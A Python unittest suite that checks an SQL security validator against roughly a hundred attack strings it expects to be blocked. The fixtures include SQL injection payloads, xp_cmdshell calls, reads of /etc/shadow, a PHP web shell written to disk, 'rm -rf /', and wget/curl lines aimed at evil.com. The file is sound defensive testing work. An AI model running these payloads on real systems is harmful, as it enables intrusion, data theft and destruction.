#!/usr/bin/env python3
"""
Comprehensive SQL Security Validation Tests

This test suite covers 40+ attack patterns and security validation scenarios:
- SQL Injection patterns (Union, Boolean, Time-based, Error-based)
- Shell command injection
- File system access attempts
- System information disclosure
- Database enumeration attacks
- Encoding and obfuscation techniques
- Comment-based attacks
- System function abuse
- Cross-platform attack vectors
"""

import unittest
import re
from typing import Dict, List

# Import the function we want to test
from app import validate_sql_security


class TestComprehensiveSQLSecurity(unittest.TestCase):
    """Test comprehensive SQL security validation with 40+ attack patterns"""
    
    def setUp(self):
        """Set up test cases with attack patterns"""
        # Define comprehensive attack patterns with expected results
        self.sql_injection_attacks = [
            # Classic SQL Injection
            ("SELECT * FROM users WHERE id = 1 OR 1=1", "Boolean-based SQL injection"),
            ("SELECT * FROM users WHERE id = 1' OR '1'='1", "Quote-based boolean injection"),
            ("SELECT * FROM users WHERE id = 1 AND 1=1", "Boolean condition injection"),
            ("SELECT * FROM users WHERE name = 'admin' OR 'x'='x'", "Always-true condition"),
            
            # Union-based SQL Injection
            ("SELECT id FROM users UNION SELECT password FROM admin", "Union-based injection"),
            ("SELECT * FROM products UNION ALL SELECT username, password FROM users", "Union all injection"),
            ("' UNION SELECT null, username, password FROM users --", "Union with null values"),
            ("1' UNION SELECT database(), user(), version() --", "Union with system functions"),
            
            # Comment-based Attacks
            ("SELECT * FROM users WHERE id = 1 -- AND active = 1", "Comment bypass"),
            ("SELECT * FROM users WHERE id = 1 /* comment */ AND active = 1", "Block comment"),
            ("SELECT * FROM users WHERE id = 1; -- DROP TABLE logs;", "Comment with dangerous operation"),
            ("SELECT * FROM users # WHERE deleted = 0", "Hash comment (MySQL)"),
            
            # Stacked Queries / Multiple Statements
            ("SELECT * FROM users; DROP TABLE sessions;", "Stacked query with DROP"),
            ("SELECT * FROM users; DELETE FROM audit_logs;", "Stacked query with DELETE"),
            ("SELECT * FROM users; INSERT INTO admin_users VALUES ('hacker', 'pass');", "Stacked insert"),
            ("SELECT * FROM users; TRUNCATE TABLE security_logs;", "Stacked truncate"),
            
            # Subquery Injection
            ("SELECT * FROM users WHERE id IN (SELECT id FROM admin WHERE name = 'root')", "Subquery injection"),
            ("SELECT * FROM users WHERE id = (SELECT MIN(id) FROM users WHERE admin = 1)", "Scalar subquery injection"),
            
            # Error-based SQL Injection
            ("SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0", "Error-based injection"),
            ("SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))", "MySQL error injection"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)", "MySQL double injection"),
        ]
        
        self.shell_command_attacks = [
            # Direct Shell Commands
            ("SELECT * FROM users; EXEC xp_cmdshell 'dir'", "SQL Server command shell"),
            ("SELECT * FROM users; EXEC xp_cmdshell 'whoami'", "System user enumeration"),
            ("SELECT system('ls -la')", "MySQL system function"),
            ("SELECT * FROM users WHERE cmd = 'powershell Get-Process'", "PowerShell reference"),
            ("SELECT * FROM users; bash -c 'rm -rf /'", "Bash command injection"),
            ("SELECT * FROM users WHERE path = '/bin/sh'", "Shell binary path"),
            
            # System Function Abuse
            ("EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT", "OLE automation creation"),
            ("EXEC sp_oamethod @shell, 'run', null, 'calc.exe'", "OLE method execution"),
            ("SELECT shell_exec('whoami')", "PHP shell_exec function"),
            ("SELECT passthru('id')", "PHP passthru function"),
            ("SELECT proc_open('/bin/bash', null, null)", "PHP proc_open function"),
            
            # Registry and Service Manipulation (Windows)
            ("EXEC xp_regread 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'", "Registry access"),
            ("SELECT * FROM users; reg add HKLM\\Software\\Test", "Registry modification"),
            ("SELECT * FROM users; sc create malware binpath= 'c:\\malware.exe'", "Service creation"),
            ("SELECT * FROM users; net user hacker password /add", "User account creation"),
            ("SELECT * FROM users; wmic process call create 'calc.exe'", "WMI command execution"),
            
            # Unix/Linux Commands
            ("SELECT * FROM users; chmod +x /tmp/backdoor", "File permission modification"),
            ("SELECT * FROM users; chown root:root /tmp/backdoor", "File ownership change"),
            ("SELECT * FROM users; sudo su -", "Privilege escalation"),
            ("SELECT * FROM users; kill -9 $$", "Process termination"),
            ("SELECT * FROM users; ps aux | grep root", "Process enumeration"),
            ("SELECT * FROM users; cat /etc/passwd", "System file access"),
            ("SELECT * FROM users; find / -name '*.conf'", "System file discovery"),
            ("SELECT * FROM users; wget http://evil.com/backdoor", "Remote file download"),
            ("SELECT * FROM users; curl -X POST http://evil.com/exfiltrate", "Data exfiltration"),
            
            # Command Chaining and Execution
            ("SELECT * FROM users | sh", "Pipe to shell"),
            ("SELECT * FROM users && rm -rf /", "Command chaining"),
            ("SELECT * FROM users; $(whoami)", "Command substitution"),
            ("SELECT * FROM users; `id`", "Backtick command execution"),
            ("SELECT * FROM users; eval('rm -rf /')", "Eval function abuse"),
        ]
        
        self.file_system_attacks = [
            # File Read Operations
            ("SELECT LOAD_FILE('/etc/passwd')", "System password file access"),
            ("SELECT LOAD_FILE('/etc/shadow')", "Shadow password file access"),
            ("SELECT LOAD_FILE('/etc/hosts')", "System hosts file access"),
            ("SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')", "Windows hosts file"),
            ("SELECT LOAD_FILE('/proc/version')", "System version information"),
            ("SELECT LOAD_FILE('/etc/mysql/my.cnf')", "Database configuration file"),
            
            # File Write Operations
            ("SELECT 'malicious code' INTO OUTFILE '/tmp/backdoor.php'", "File creation"),
            ("SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'", "Web shell creation"),
            ("SELECT * FROM users INTO DUMPFILE '/tmp/users.txt'", "Data dumping to file"),
            ("SELECT unhex('4D5A90') INTO DUMPFILE '/tmp/malware.exe'", "Binary file creation"),
            
            # Bulk Operations
            ("BULK INSERT users FROM 'c:\\temp\\malicious_users.txt'", "Bulk data injection"),
            ("BULK INSERT logs FROM '\\\\attacker.com\\share\\fake_logs.txt'", "Network bulk injection"),
        ]
        
        self.information_disclosure_attacks = [
            # Database Enumeration
            ("SELECT * FROM information_schema.tables", "Table enumeration"),
            ("SELECT * FROM information_schema.columns", "Column enumeration"),
            ("SELECT * FROM information_schema.schemata", "Schema enumeration"),
            ("SELECT table_name FROM information_schema.tables WHERE table_schema = database()", "Current DB tables"),
            
            # System Information
            ("SELECT @@version", "Database version disclosure"),
            ("SELECT @@hostname", "Hostname disclosure"),
            ("SELECT @@datadir", "Data directory disclosure"),
            ("SELECT user()", "Current user disclosure"),
            ("SELECT database()", "Current database disclosure"),
            ("SELECT connection_id()", "Connection information"),
            
            # System Database Access
            ("SELECT * FROM master.dbo.sysdatabases", "SQL Server system databases"),
            ("SELECT * FROM master.dbo.syslogins", "SQL Server login enumeration"),
            ("SELECT * FROM msdb.dbo.backupset", "SQL Server backup information"),
            ("SELECT * FROM mysql.user", "MySQL user enumeration"),
            ("SELECT * FROM mysql.db", "MySQL database permissions"),
            ("SELECT * FROM pg_user", "PostgreSQL user enumeration"),
            ("SELECT * FROM pg_database", "PostgreSQL database enumeration"),
            
            # System Tables
            ("SELECT * FROM sys.objects", "System objects enumeration"),
            ("SELECT * FROM sys.tables", "System tables enumeration"),
            ("SELECT * FROM sys.columns", "System columns enumeration"),
            ("SELECT * FROM sysobjects", "Legacy system objects"),
            ("SELECT * FROM syscolumns", "Legacy system columns"),
        ]
        
        self.encoding_obfuscation_attacks = [
            # Hex Encoding
            ("SELECT * FROM users WHERE name = 0x41646d696e", "Hex-encoded 'Admin'"),
            ("SELECT UNHEX('53454c454354202a2046524f4d207573657273')", "Hex-encoded SQL"),
            ("SELECT CONV('admin', 36, 10)", "Base conversion obfuscation"),
            
            # Character Function Bypasses
            ("SELECT * FROM users WHERE name = CHAR(65,68,77,73,78)", "CHAR function bypass"),
            ("SELECT CONCAT(CHAR(83,69,76,69,67,84), ' * FROM users')", "Concatenated CHAR bypass"),
            ("SELECT * FROM users WHERE name = ASCII('A')", "ASCII function usage"),
            
            # Unicode and Encoding Attacks
            ("SELECT * FROM users WHERE name = N'admin'", "Unicode string"),
            ("SELECT * FROM users WHERE name LIKE '%αdmin%'", "Unicode lookalike characters"),
            
            # Time-based Blind Injection
            ("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '00:00:05'", "SQL Server time delay"),
            ("SELECT * FROM users WHERE id = 1 AND SLEEP(5)", "MySQL sleep function"),
            ("SELECT * FROM users WHERE id = 1; SELECT pg_sleep(5)", "PostgreSQL sleep"),
            ("SELECT BENCHMARK(1000000, SHA1('test'))", "MySQL benchmark function"),
            
            # Case Manipulation and Whitespace
            ("SeLeCt * FrOm UsErS", "Case variation"),
            ("SELECT/**/*/**/FROM/**/users", "Comment-based whitespace"),
            ("SELECT\t*\nFROM\r\nusers", "Mixed whitespace characters"),
        ]
        
        self.default_resource_attacks = [
            # Default Database Access
            ("USE master; SELECT * FROM sysdatabases", "SQL Server master database"),
            ("USE mysql; SELECT * FROM user", "MySQL system database"),
            ("\\c postgres; SELECT * FROM pg_user", "PostgreSQL default database"),
            ("USE admin; db.users.find()", "MongoDB admin database"),
            ("SELECT * FROM test.sample_data", "Test database access"),
            ("SELECT * FROM demo.products", "Demo database access"),
            ("SELECT * FROM example.users", "Example database access"),
            
            # Default Account Usage
            ("SELECT * FROM users WHERE username = 'sa'", "SQL Server default admin"),
            ("SELECT * FROM users WHERE username = 'root'", "Default root account"),
            ("SELECT * FROM users WHERE username = 'admin'", "Default admin account"),
            ("SELECT * FROM users WHERE username = 'guest'", "Default guest account"),
            ("SELECT * FROM users WHERE username = 'test'", "Test account"),
            ("SELECT * FROM users WHERE username = ''", "Empty username"),
            ("SELECT * FROM users WHERE username IS NULL", "NULL username"),
        ]
    
    def test_sql_injection_detection(self):
        """Test detection of SQL injection patterns"""
        for attack_query, description in self.sql_injection_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be detected as invalid
                self.assertFalse(result['valid'], 
                    f"Failed to detect {description}: {attack_query[:100]}")
                
                # Should have high or critical severity
                self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                    f"Severity too low for {description}: {result['severity']}")
                
                # Should have error messages
                self.assertGreater(len(result['errors']), 0,
                    f"No errors reported for {description}")
    
    def test_shell_command_detection(self):
        """Test detection of shell command injection"""
        for attack_query, description in self.shell_command_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be detected as invalid
                self.assertFalse(result['valid'],
                    f"Failed to detect {description}: {attack_query[:100]}")
                
                # Shell commands should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"Shell command should be critical severity: {description}")
                
                # Should have shell-related error messages
                shell_related = any('shell' in error.lower() or 'command' in error.lower() 
                                   for error in result['errors'])
                self.assertTrue(shell_related,
                    f"No shell-related error for {description}: {result['errors']}")
    
    def test_file_system_access_detection(self):
        """Test detection of file system access attempts"""
        for attack_query, description in self.file_system_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be detected as invalid
                self.assertFalse(result['valid'],
                    f"Failed to detect {description}: {attack_query[:100]}")
                
                # File operations should be high severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"File operation severity too low: {description}")
                
                # Should have file-related error messages
                file_related = any(
                    term in ' '.join(result['errors']).lower() 
                    for term in ['file', 'outfile', 'load_file', 'bulk']
                )
                self.assertTrue(file_related,
                    f"No file-related error for {description}: {result['errors']}")
    
    def test_information_disclosure_detection(self):
        """Test detection of information disclosure attempts"""
        for attack_query, description in self.information_disclosure_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be detected as invalid
                self.assertFalse(result['valid'],
                    f"Failed to detect {description}: {attack_query[:100]}")
                
                # Information disclosure should be medium to high severity
                self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                    f"Information disclosure severity too low: {description}")
    
    def test_encoding_obfuscation_detection(self):
        """Test detection of encoding and obfuscation techniques"""
        for attack_query, description in self.encoding_obfuscation_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Most encoding attempts should be detected
                if any(term in attack_query.lower() for term in ['waitfor', 'sleep', 'benchmark']):
                    # Time-based attacks should definitely be blocked
                    self.assertFalse(result['valid'],
                        f"Failed to detect time-based attack: {description}")
                    self.assertIn(result['severity'], ['high', 'critical'],
                        f"Time-based attack severity too low: {description}")
                elif 'char(' in attack_query.lower() or '0x' in attack_query.lower():
                    # Encoding bypasses should be detected
                    self.assertFalse(result['valid'],
                        f"Failed to detect encoding bypass: {description}")
    
    def test_default_resource_warnings(self):
        """Test warnings for default database and account access"""
        for attack_query, description in self.default_resource_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should generate warnings or errors
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"No warnings/errors for default resource access: {description}")
                
                # Check for default-related warnings
                if result['warnings']:
                    default_warning = any(
                        term in ' '.join(result['warnings']).lower()
                        for term in ['default', 'test', 'admin', 'root', 'guest', 'sa']
                    )
                    self.assertTrue(default_warning,
                        f"No default resource warning for: {description}")
    
    def test_clean_queries_pass_validation(self):
        """Test that legitimate queries pass validation"""
        clean_queries = [
            "SELECT id, name, email FROM customers WHERE active = 1",
            "UPDATE products SET price = 19.99 WHERE category = 'electronics'",
            "INSERT INTO orders (customer_id, total, created_at) VALUES (1, 99.99, NOW())",
            "DELETE FROM temp_data WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY)",
            "SELECT COUNT(*) FROM sales WHERE date >= '2023-01-01'",
            "SELECT AVG(rating) FROM reviews WHERE product_id = 123",
            "CREATE TABLE new_products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(100))",
            "ALTER TABLE users ADD COLUMN last_login TIMESTAMP",
            "CREATE INDEX idx_email ON users(email)",
            "GRANT SELECT ON products TO 'read_only_user'@'localhost'"
        ]
        
        for clean_query in clean_queries:
            with self.subTest(query=clean_query[:50]):
                result = validate_sql_security(clean_query)
                
                # Clean queries should pass or have only low severity warnings
                if not result['valid']:
                    self.assertIn(result['severity'], ['low', 'medium'],
                        f"Clean query failed with high severity: {clean_query}")
                else:
                    self.assertEqual(result['severity'], 'low',
                        f"Clean query has unexpected severity: {clean_query}")
    
    def test_syntax_validation(self):
        """Test basic SQL syntax validation"""
        syntax_errors = [
            "SELECT * FROM users WHERE (name = 'test'",  # Unmatched parentheses
            "SELECT * FROM users WHERE name = 'test",     # Unmatched quotes
            "SELECT * FROM users WHERE name = 'test' AND (age > 18",  # Multiple syntax errors
        ]
        
        for bad_query in syntax_errors:
            with self.subTest(query=bad_query):
                result = validate_sql_security(bad_query)
                
                self.assertFalse(result['valid'], f"Syntax error not detected: {bad_query}")
                
                syntax_error = any(
                    term in ' '.join(result['errors']).lower()
                    for term in ['parentheses', 'quotes', 'unmatched']
                )
                self.assertTrue(syntax_error,
                    f"No syntax error reported for: {bad_query}")
    
    def test_multiple_statement_detection(self):
        """Test detection of multiple statements in queries"""
        multiple_statements = [
            "SELECT * FROM users; SELECT * FROM admin;",
            "INSERT INTO logs VALUES (1, 'test'); DELETE FROM temp;",
            "UPDATE users SET active = 1; DROP TABLE sessions;",
        ]
        
        for query in multiple_statements:
            with self.subTest(query=query[:50]):
                result = validate_sql_security(query)
                
                # Should generate warnings for multiple statements
                self.assertGreater(len(result['warnings']), 0,
                    f"No warnings for multiple statements: {query}")
                
                multiple_warning = any(
                    'multiple' in warning.lower() 
                    for warning in result['warnings']
                )
                self.assertTrue(multiple_warning,
                    f"No multiple statement warning: {query}")
    
    def test_extremely_long_queries(self):
        """Test detection of extremely long queries (potential obfuscation)"""
        # Create extremely long query
        long_query = "SELECT * FROM users WHERE name = '" + "A" * 1500 + "'"
        
        result = validate_sql_security(long_query)
        
        # Should generate warnings for long lines
        self.assertGreater(len(result['warnings']), 0,
            "No warnings for extremely long query")
        
        long_line_warning = any(
            'long line' in warning.lower() 
            for warning in result['warnings']
        )
        self.assertTrue(long_line_warning,
            "No long line warning for extremely long query")
    
    def test_non_ascii_character_detection(self):
        """Test detection of non-ASCII characters (encoding attacks)"""
        non_ascii_query = "SELECT * FROM users WHERE name = 'tëst'"
        
        result = validate_sql_security(non_ascii_query)
        
        # Should generate warnings for non-ASCII characters
        self.assertGreater(len(result['warnings']), 0,
            "No warnings for non-ASCII characters")
        
        encoding_warning = any(
            'ascii' in warning.lower() or 'encoding' in warning.lower()
            for warning in result['warnings']
        )
        self.assertTrue(encoding_warning,
            "No encoding warning for non-ASCII query")
    
    def test_comprehensive_attack_scenarios(self):
        """Test complex multi-vector attack scenarios"""
        complex_attacks = [
            # Multi-vector attack
            ("SELECT * FROM users WHERE id = 1 OR 1=1 UNION SELECT username, password FROM admin -- comment",
             "Multi-vector SQL injection with union and comments"),
            
            # Encoded shell command
            ("SELECT * FROM users; EXEC xp_cmdshell CHAR(119,104,111,97,109,105)",
             "Encoded shell command execution"),
            
            # File access with union
            ("' UNION SELECT LOAD_FILE('/etc/passwd'), null, null --",
             "Union-based file access attack"),
            
            # Information disclosure with time delay
            ("SELECT IF((SELECT COUNT(*) FROM information_schema.tables) > 0, SLEEP(5), 0)",
             "Conditional time-based information disclosure"),
        ]
        
        for attack_query, description in complex_attacks:
            with self.subTest(description=description):
                result = validate_sql_security(attack_query)
                
                # Complex attacks should definitely be blocked
                self.assertFalse(result['valid'],
                    f"Failed to detect complex attack: {description}")
                
                # Should have critical or high severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Complex attack severity too low: {description}")
                
                # Should have multiple error types
                self.assertGreater(len(result['errors']), 1,
                    f"Complex attack should trigger multiple errors: {description}")


class TestSQLSecurityPatternCoverage(unittest.TestCase):
    """Test coverage of security patterns and edge cases"""
    
    def test_pattern_coverage_metrics(self):
        """Test that security validation covers expected number of patterns"""
        # Test a known dangerous query to get pattern count
        result = validate_sql_security("SELECT * FROM users WHERE id = 1 OR 1=1")
        
        # Should check a reasonable number of patterns (40+ total as specified)
        self.assertGreaterEqual(result['patterns_checked'], 40,
            "Should check at least 40 security patterns")
    
    def test_severity_escalation(self):
        """Test that severity escalates appropriately"""
        queries_by_severity = {
            'low': ["SELECT * FROM customers WHERE active = 1"],
            'medium': ["SELECT * FROM users WHERE username = 'test'"],  # Default user warning
            'high': ["SELECT * FROM users WHERE id = 1 OR 1=1"],       # SQL injection
            'critical': ["SELECT * FROM users; xp_cmdshell 'whoami'"]  # Shell command
        }
        
        for expected_severity, queries in queries_by_severity.items():
            for query in queries:
                with self.subTest(severity=expected_severity, query=query[:50]):
                    result = validate_sql_security(query)
                    
                    if expected_severity == 'low':
                        # Low severity queries might pass validation
                        if not result['valid']:
                            self.assertEqual(result['severity'], 'low')
                        else:
                            self.assertEqual(result['severity'], 'low')
                    else:
                        # Higher severity queries should be blocked with appropriate severity
                        if not result['valid']:
                            severity_levels = ['low', 'medium', 'high', 'critical']
                            expected_index = severity_levels.index(expected_severity)
                            actual_index = severity_levels.index(result['severity'])
                            
                            self.assertGreaterEqual(actual_index, expected_index,
                                f"Actual severity '{result['severity']}' too low, expected at least '{expected_severity}'")


if __name__ == '__main__':
    # Run comprehensive SQL security tests
    unittest.main(verbosity=2)